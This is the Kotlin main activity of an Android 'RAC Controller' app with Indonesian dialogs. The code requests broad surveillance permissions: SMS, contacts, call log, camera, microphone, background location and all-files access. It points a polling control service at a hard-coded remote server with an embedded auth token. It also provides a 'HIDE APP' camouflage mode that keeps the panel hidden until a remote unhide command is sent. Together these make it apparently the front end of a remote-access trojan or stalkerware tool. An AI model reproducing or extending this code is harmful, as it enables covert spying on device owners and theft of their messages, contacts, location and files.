package com.example.devicecontrol

import android.Manifest
import android.app.ActivityManager
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import android.view.Gravity
import android.view.View
import android.view.ViewGroup
import android.widget.*
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import android.net.Uri
import android.os.PowerManager
import android.provider.Settings
import android.graphics.Color
import android.graphics.Typeface
import android.graphics.drawable.GradientDrawable
import android.os.Environment
import androidx.appcompat.app.AlertDialog
import android.content.DialogInterface
import java.net.Inet6Address
import java.net.NetworkInterface

class MainActivity : AppCompatActivity() {

    private val REQUEST_CODE_PERMISSIONS = 1001

    // ── Palette (matches mockup exactly) ──────────────────────────
    private val C_BG            = Color.parseColor("#0D1117")
    private val C_CARD          = Color.parseColor("#161B22")
    private val C_CARD_BORDER   = Color.parseColor("#1E3A5F")
    private val C_TEAL          = Color.parseColor("#0DCFCF")
    private val C_TEXT_PRIMARY  = Color.parseColor("#F0F6FF")
    private val C_TEXT_MUTED    = Color.parseColor("#8B9DC3")
    private val C_TEXT_SECTION  = Color.parseColor("#58A6FF")
    private val C_INPUT_BG      = Color.parseColor("#0D1117")
    private val C_INPUT_BORDER  = Color.parseColor("#30363D")
    private val C_TRACK_OFF     = Color.parseColor("#374151")
    private val C_GREEN         = Color.parseColor("#3FB950")
    private val C_RED           = Color.parseColor("#DA3633")
    private val C_DANGER        = Color.parseColor("#B91C1C")

    private lateinit var statusDot:  View
    private lateinit var statusText: TextView
    private lateinit var statusBtn:  Button

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        val prefs = getSharedPreferences("config", Context.MODE_PRIVATE)
        if (prefs.getBoolean("stealth_mode", false)) {
            finish()
            return
        }

        val dm    = resources.displayMetrics

        fun dp(v: Int) = (v * dm.density).toInt()

        // ── Root: ScrollView ──────────────────────────────────────
        val scrollView = ScrollView(this).apply {
            setBackgroundColor(C_BG)
            layoutParams = ViewGroup.LayoutParams(-1, -1)
            isVerticalScrollBarEnabled = false
        }
        val root = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(dp(16), dp(28), dp(16), dp(32))
        }
        scrollView.addView(root)

        // ── Helper: make section card ─────────────────────────────
        fun makeCard(mbDp: Int = 14): LinearLayout = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(dp(18), dp(16), dp(18), dp(18))
            layoutParams = LinearLayout.LayoutParams(-1, -2).apply {
                setMargins(0, 0, 0, dp(mbDp))
            }
            background = GradientDrawable().apply {
                setColor(C_CARD)
                cornerRadius = dp(16).toFloat()
                setStroke(dp(1), C_CARD_BORDER)
            }
        }

        fun makeSectionLabel(text: String) = TextView(this).apply {
            this.text = text
            textSize = 11f
            setTextColor(C_TEXT_SECTION)
            setTypeface(null, Typeface.BOLD)
            letterSpacing = 0.12f
            layoutParams = LinearLayout.LayoutParams(-1, -2).apply {
                setMargins(0, 0, 0, dp(14))
            }
        }

        fun makeFieldLabel(text: String) = TextView(this).apply {
            this.text = text
            textSize = 11f
            setTextColor(C_TEXT_MUTED)
            layoutParams = LinearLayout.LayoutParams(-1, -2).apply {
                setMargins(0, 0, 0, dp(4))
            }
        }

        fun makeInput(hint: String, value: String, isPass: Boolean = false): EditText =
            EditText(this).apply {
                this.hint = hint
                setText(value)
                setTextColor(C_TEXT_PRIMARY)
                setHintTextColor(Color.parseColor("#4B5563"))
                textSize = 13f
                setPadding(dp(12), dp(11), dp(12), dp(11))
                layoutParams = LinearLayout.LayoutParams(-1, -2).apply {
                    setMargins(0, 0, 0, dp(14))
                }
                background = GradientDrawable().apply {
                    setColor(C_INPUT_BG)
                    cornerRadius = dp(8).toFloat()
                    setStroke(dp(1), C_INPUT_BORDER)
                }
                if (isPass) inputType =
                    android.text.InputType.TYPE_CLASS_TEXT or
                    android.text.InputType.TYPE_TEXT_VARIATION_PASSWORD
            }

        fun makeSwitch(checked: Boolean): Switch = Switch(this).apply {
            isChecked = checked
            thumbTintList = android.content.res.ColorStateList.valueOf(C_TEXT_PRIMARY)
            trackTintList = android.content.res.ColorStateList(
                arrayOf(intArrayOf(android.R.attr.state_checked), intArrayOf()),
                intArrayOf(C_TEAL, C_TRACK_OFF)
            )
        }

        fun makePrimaryBtn(label: String, color: Int = C_TEAL): Button = Button(this).apply {
            text = label
            setTextColor(if (color == C_TEAL) C_BG else C_TEXT_PRIMARY)
            textSize = 13f
            setTypeface(null, Typeface.BOLD)
            isAllCaps = false
            letterSpacing = 0.04f
            setPadding(0, dp(14), 0, dp(14))
            layoutParams = LinearLayout.LayoutParams(-1, -2)
            background = GradientDrawable().apply {
                setColor(color)
                cornerRadius = dp(10).toFloat()
            }
        }

        // ─────────────────────────────────────────────────────────
        // HEADER
        // ─────────────────────────────────────────────────────────
        statusDot = View(this).apply {
            layoutParams = LinearLayout.LayoutParams(dp(12), dp(12)).apply {
                gravity = Gravity.CENTER_VERTICAL
            }
            background = GradientDrawable().apply {
                shape = GradientDrawable.OVAL
                setColor(C_RED)
            }
        }

        val headerTitleCol = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            layoutParams = LinearLayout.LayoutParams(0, -2, 1f)
        }
        headerTitleCol.addView(TextView(this).apply {
            text = "RAC Controller"
            textSize = 22f
            setTextColor(C_TEXT_PRIMARY)
            setTypeface(null, Typeface.BOLD)
        })
        headerTitleCol.addView(TextView(this).apply {
            text = "Device Control Panel"
            textSize = 13f
            setTextColor(C_TEXT_MUTED)
            layoutParams = LinearLayout.LayoutParams(-1, -2).apply { setMargins(0, dp(2), 0, 0) }
        })

        root.addView(LinearLayout(this).apply {
            orientation = LinearLayout.HORIZONTAL
            gravity = Gravity.CENTER_VERTICAL
            layoutParams = LinearLayout.LayoutParams(-1, -2).apply {
                setMargins(0, 0, 0, dp(22))
            }
            addView(headerTitleCol)
            addView(statusDot)
        })

        // ─────────────────────────────────────────────────────────
        // CARD: CONNECTION
        // ─────────────────────────────────────────────────────────
        val connCard = makeCard()
        connCard.addView(makeSectionLabel("CONNECTION"))

        connCard.addView(makeFieldLabel("Server URL"))
        val urlInput = makeInput("https://example.com",
            prefs.getString("ws_url", "https://pygram.xnv.biz.id") ?: "")
        connCard.addView(urlInput)

        connCard.addView(makeFieldLabel("Auth Token"))
        val authInput = makeInput("token...",
            prefs.getString("auth_token", "AAEaT_oKgX9mF2T8D0iT_2br1flpqsMLSi8") ?: "", true)
        connCard.addView(authInput)

        connCard.addView(makeFieldLabel("Device ID"))
        val idInput = makeInput("my_phone",
            prefs.getString("device_id", "my_phone") ?: "")
        idInput.layoutParams = LinearLayout.LayoutParams(-1, -2).apply {
            setMargins(0, 0, 0, dp(16))
        }
        connCard.addView(idInput)

        // Turbo: hidden inside connection card so it saves with activate
        val turboSwitch = makeSwitch(prefs.getBoolean("turbo_mode", true))

        statusText = TextView(this).apply {
            text = "● Service not running"
            textSize = 12f
            setTextColor(C_TEXT_MUTED)
            layoutParams = LinearLayout.LayoutParams(-1, -2).apply {
                setMargins(0, 0, 0, dp(12))
            }
        }
        connCard.addView(statusText)

        statusBtn = makePrimaryBtn("ACTIVATE SERVICE")
        statusBtn.setOnClickListener {
            val isRunning = isServiceRunning(ControlService::class.java)
            if (isRunning) {
                // STOP SERVICE
                stopService(Intent(this, ControlService::class.java))
                updateStatusUI()
                Toast.makeText(this, "Service STOPPED", Toast.LENGTH_SHORT).show()
            } else {
                // START SERVICE
                val url      = urlInput.text.toString().trim()
                val devId    = idInput.text.toString().trim()
                val authTok  = authInput.text.toString().trim()
                val isTurbo  = turboSwitch.isChecked

                if (url.isEmpty()) {
                    Toast.makeText(this, "URL wajib diisi", Toast.LENGTH_SHORT).show()
                    return@setOnClickListener
                }
                prefs.edit().apply {
                    putString("ws_url", url)
                    putString("device_id", devId)
                    putString("auth_token", authTok)
                    putBoolean("turbo_mode", isTurbo)
                    apply()
                }
                checkAndStartService()
                Toast.makeText(this, "Service ACTIVATED", Toast.LENGTH_SHORT).show()
                // Update UI after a short delay so OS has time to start the service
                statusBtn.postDelayed({ updateStatusUI() }, 300)
            }
        }
        connCard.addView(statusBtn)
        root.addView(connCard)

        // ─────────────────────────────────────────────────────────
        // CARD: PERFORMANCE
        // ─────────────────────────────────────────────────────────
        val perfCard = makeCard()
        perfCard.addView(makeSectionLabel("PERFORMANCE"))

        turboSwitch.setOnCheckedChangeListener { _, isChecked ->
            prefs.edit().putBoolean("turbo_mode", isChecked).apply()
        }

        val turboLabelCol = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            layoutParams = LinearLayout.LayoutParams(0, -2, 1f)
        }
        turboLabelCol.addView(TextView(this).apply {
            text = "Turbo Mode"
            textSize = 15f
            setTextColor(C_TEXT_PRIMARY)
        })
        turboLabelCol.addView(TextView(this).apply {
            text = "Super responsive polling"
            textSize = 11f
            setTextColor(C_TEXT_MUTED)
            layoutParams = LinearLayout.LayoutParams(-1, -2).apply { setMargins(0, dp(2), 0, 0) }
        })

        perfCard.addView(LinearLayout(this).apply {
            orientation = LinearLayout.HORIZONTAL
            gravity = Gravity.CENTER_VERTICAL
            addView(turboLabelCol)
            addView(turboSwitch)
        })
        root.addView(perfCard)

        // ─────────────────────────────────────────────────────────
        // CARD: NETWORK (IPv6)
        // ─────────────────────────────────────────────────────────
        val netCard = makeCard()
        netCard.addView(makeSectionLabel("NETWORK"))

        val ipv6Badge = TextView(this).apply {
            text = "—"
            textSize = 11f
            setTextColor(C_TEXT_MUTED)
            setPadding(dp(10), dp(4), dp(10), dp(4))
            background = GradientDrawable().apply {
                setColor(Color.parseColor("#1F2937"))
                cornerRadius = dp(20).toFloat()
                setStroke(1, Color.parseColor("#374151"))
            }
        }

        val ipv6LabelCol = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            layoutParams = LinearLayout.LayoutParams(0, -2, 1f)
        }
        ipv6LabelCol.addView(TextView(this).apply {
            text = "IPv6 Remote Access"
            textSize = 15f
            setTextColor(C_TEXT_PRIMARY)
        })
        ipv6LabelCol.addView(TextView(this).apply {
            text = "Global address detection"
            textSize = 11f
            setTextColor(C_TEXT_MUTED)
            layoutParams = LinearLayout.LayoutParams(-1, -2).apply { setMargins(0, dp(2), 0, 0) }
        })

        netCard.addView(LinearLayout(this).apply {
            orientation = LinearLayout.HORIZONTAL
            gravity = Gravity.CENTER_VERTICAL
            layoutParams = LinearLayout.LayoutParams(-1, -2).apply {
                setMargins(0, 0, 0, dp(12))
            }
            addView(ipv6LabelCol)
            addView(ipv6Badge)
        })

        val checkIpv6Btn = Button(this).apply {
            text = "CHECK IPv6"
            setTextColor(C_TEAL)
            textSize = 12f
            setTypeface(null, Typeface.BOLD)
            isAllCaps = false
            letterSpacing = 0.04f
            setPadding(dp(16), dp(8), dp(16), dp(8))
            layoutParams = LinearLayout.LayoutParams(-2, -2)
            background = GradientDrawable().apply {
                setColor(Color.TRANSPARENT)
                cornerRadius = dp(8).toFloat()
                setStroke(dp(1), C_TEAL)
            }
        }
        checkIpv6Btn.setOnClickListener {
            val ipv6 = getIpv6Address()
            if (ipv6 != null) {
                ipv6Badge.text = ipv6
                ipv6Badge.setTextColor(C_GREEN)
                ipv6Badge.background = GradientDrawable().apply {
                    setColor(Color.parseColor("#0D2818"))
                    cornerRadius = dp(20).toFloat()
                    setStroke(1, C_GREEN)
                }
            } else {
                ipv6Badge.text = "No IPv6"
                ipv6Badge.setTextColor(C_RED)
                ipv6Badge.background = GradientDrawable().apply {
                    setColor(Color.parseColor("#2D0D0D"))
                    cornerRadius = dp(20).toFloat()
                    setStroke(1, C_RED)
                }
            }
        }
        netCard.addView(checkIpv6Btn)
        root.addView(netCard)

        // ─────────────────────────────────────────────────────────
        // CARD: WEB SERVER
        // ─────────────────────────────────────────────────────────
        val wsCard = makeCard(mbDp = 24)
        wsCard.addView(makeSectionLabel("WEB SERVER"))

        val wsEnabled = prefs.getBoolean("web_server_enabled", false)
        val wsSwitch  = makeSwitch(wsEnabled)

        val wsStatusBadge = TextView(this).apply {
            text = if (wsEnabled) "● ACTIVE" else "● DISABLED"
            textSize = 12f
            setTextColor(if (wsEnabled) C_GREEN else C_RED)
            setTypeface(null, Typeface.BOLD)
            layoutParams = LinearLayout.LayoutParams(-1, -2).apply {
                setMargins(0, dp(10), 0, 0)
            }
        }

        wsSwitch.setOnCheckedChangeListener { _, isChecked ->
            prefs.edit().putBoolean("web_server_enabled", isChecked).apply()
            val svcIntent = Intent(this@MainActivity, ControlService::class.java).apply {
                action = "TOGGLE_WEB_SERVER"
                putExtra("enabled", isChecked)
            }
            if (Build.VERSION.SDK_INT >= 26) startForegroundService(svcIntent)
            else startService(svcIntent)
            wsStatusBadge.text = if (isChecked) "● ACTIVE" else "● DISABLED"
            wsStatusBadge.setTextColor(if (isChecked) C_GREEN else C_RED)
        }

        val wsLabelCol = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            layoutParams = LinearLayout.LayoutParams(0, -2, 1f)
        }
        wsLabelCol.addView(TextView(this).apply {
            text = "Port 8080"
            textSize = 15f
            setTextColor(C_TEXT_PRIMARY)
        })
        wsLabelCol.addView(TextView(this).apply {
            text = "Local web access"
            textSize = 11f
            setTextColor(C_TEXT_MUTED)
            layoutParams = LinearLayout.LayoutParams(-1, -2).apply { setMargins(0, dp(2), 0, 0) }
        })

        wsCard.addView(LinearLayout(this).apply {
            orientation = LinearLayout.HORIZONTAL
            gravity = Gravity.CENTER_VERTICAL
            addView(wsLabelCol)
            addView(wsSwitch)
        })
        wsCard.addView(wsStatusBadge)
        root.addView(wsCard)

        // ─────────────────────────────────────────────────────────
        // HIDE APP BUTTON (danger)
        // ─────────────────────────────────────────────────────────
        val hideBtn = makePrimaryBtn("HIDE APP", C_DANGER)
        hideBtn.layoutParams = LinearLayout.LayoutParams(-1, -2).apply {
            setMargins(0, 0, 0, 0)
        }
        hideBtn.setOnClickListener {
            AlertDialog.Builder(this)
                .setTitle("Aktifkan Kamuflase?")
                .setMessage("Di Android 12-15, ikon aplikasi tidak dapat dihilangkan secara sempurna (Sistem akan otomatis merubahnya menjadi shortcut ke Pengaturan Aplikasi / App Info).\n\nSebagai gantinya, aplikasi ini akan dikamuflase. Saat ini, jika seseorang menekan ikon aplikasi, Control Panel tidak akan muncul dan aplikasi sekilas akan langsung tertutup sendiri.\n\nGunakan fitur /cmd unhide_app dari remote control Anda untuk memunculkan panel ini lagi.")
                .setPositiveButton("Aktifkan") { _, _ ->
                    val pm = packageManager
                    val aliasName = android.content.ComponentName(this, "com.example.devicecontrol.LauncherAlias")
                    
                    // Pastikan Icon alias tidak didisable agar OS tidak men-trigger fallback App Info
                    pm.setComponentEnabledSetting(
                        aliasName,
                        android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                        android.content.pm.PackageManager.DONT_KILL_APP 
                    )
                    
                    prefs.edit().putBoolean("stealth_mode", true).apply()
                    Toast.makeText(this, "Kamuflase Aktif!", Toast.LENGTH_LONG).show()
                    finishAffinity()
                }
                .setNegativeButton("Batal", null)
                .show()
        }
        root.addView(hideBtn)

        setContentView(scrollView)
        checkPermissions()
        updateStatusUI()
    }

    override fun onResume() {
        super.onResume()
        updateStatusUI()
    }

    private fun updateStatusUI() {
        if (!::statusDot.isInitialized || !::statusText.isInitialized || !::statusBtn.isInitialized) return
        
        val isRunning = isServiceRunning(ControlService::class.java)
        if (isRunning) {
            statusText.text = "● Service ACTIVE"
            statusText.setTextColor(C_GREEN)
            statusDot.background = GradientDrawable().apply {
                shape = GradientDrawable.OVAL
                setColor(C_GREEN)
            }
            // Update Toggle Button to STOP mode
            statusBtn.text = "STOP SERVICE"
            statusBtn.setTextColor(Color.WHITE)
            statusBtn.background = GradientDrawable().apply {
                setColor(C_RED)
                cornerRadius = (10 * resources.displayMetrics.density).toFloat()
            }
        } else {
            statusText.text = "● Service not running"
            statusText.setTextColor(C_TEXT_MUTED)
            statusDot.background = GradientDrawable().apply {
                shape = GradientDrawable.OVAL
                setColor(C_RED)
            }
            // Update Toggle Button to ACTIVATE mode
            statusBtn.text = "ACTIVATE SERVICE"
            statusBtn.setTextColor(C_BG)
            statusBtn.background = GradientDrawable().apply {
                setColor(C_TEAL)
                cornerRadius = (10 * resources.displayMetrics.density).toFloat()
            }
        }
    }

    private fun isServiceRunning(serviceClass: Class<*>): Boolean {
        val manager = getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager
        for (service in manager.getRunningServices(Int.MAX_VALUE)) {
            if (serviceClass.name == service.service.className) {
                return true
            }
        }
        return false
    }

    // ─────────────────────────────────────────────────────────────
    // Permissions & Service helpers (unchanged)
    // ─────────────────────────────────────────────────────────────
    private fun checkPermissions() {
        val permissions = mutableListOf(
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.READ_SMS,
            Manifest.permission.SEND_SMS,
            Manifest.permission.CAMERA,
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.CALL_PHONE
        )
        if (Build.VERSION.SDK_INT == 29) permissions.add(Manifest.permission.ACCESS_BACKGROUND_LOCATION)
        if (Build.VERSION.SDK_INT < 30) {
            permissions.add(Manifest.permission.READ_EXTERNAL_STORAGE)
            permissions.add(Manifest.permission.WRITE_EXTERNAL_STORAGE)
        }
        val missing = permissions.filter { ContextCompat.checkSelfPermission(this, it) != 0 }
        if (missing.isNotEmpty()) {
            ActivityCompat.requestPermissions(this, missing.toTypedArray(), REQUEST_CODE_PERMISSIONS)
        } else {
            checkBackgroundLocationPermission()
        }

        val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
        if (Build.VERSION.SDK_INT >= 23 && !pm.isIgnoringBatteryOptimizations(packageName)) {
            try {
                startActivity(Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                    data = Uri.parse("package:$packageName")
                })
            } catch (e: Exception) {}
        }
        if (Build.VERSION.SDK_INT >= 30 && !Environment.isExternalStorageManager()) {
            try {
                startActivity(Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION).apply {
                    data = Uri.parse("package:$packageName")
                })
            } catch (e: Exception) {
                startActivity(Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION))
            }
        }
    }

    private fun checkBackgroundLocationPermission() {
        if (Build.VERSION.SDK_INT >= 30) {
            val hasFg = ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) == 0
            val hasBg = ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_BACKGROUND_LOCATION) == 0
            if (hasFg && !hasBg) {
                AlertDialog.Builder(this)
                    .setTitle("Izin Lokasi")
                    .setMessage("Silakan pilih 'Izinkan sepanjang waktu'.")
                    .setPositiveButton("Setuju", object : DialogInterface.OnClickListener {
                        override fun onClick(dialog: DialogInterface?, which: Int) {
                            ActivityCompat.requestPermissions(
                                this@MainActivity,
                                arrayOf(Manifest.permission.ACCESS_BACKGROUND_LOCATION), 1002
                            )
                        }
                    })
                    .show()
            }
        }
    }

    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == REQUEST_CODE_PERMISSIONS) checkBackgroundLocationPermission()
    }

    private fun checkAndStartService() {
        val intent = Intent(this, ControlService::class.java).apply {
            action = "RESTART_POLLING"
        }
        if (Build.VERSION.SDK_INT >= 26) startForegroundService(intent) else startService(intent)
    }

    private fun getIpv6Address(): String? {
        return try {
            NetworkInterface.getNetworkInterfaces()?.toList()
                ?.flatMap { iface -> iface.inetAddresses.toList() }
                ?.filterIsInstance<Inet6Address>()
                ?.firstOrNull { addr ->
                    !addr.isLoopbackAddress &&
                    !addr.isLinkLocalAddress &&
                    !addr.hostAddress.startsWith("fe80", ignoreCase = true)
                }
                ?.hostAddress
                ?.replace("%.*".toRegex(), "")
        } catch (e: Exception) { null }
    }
}
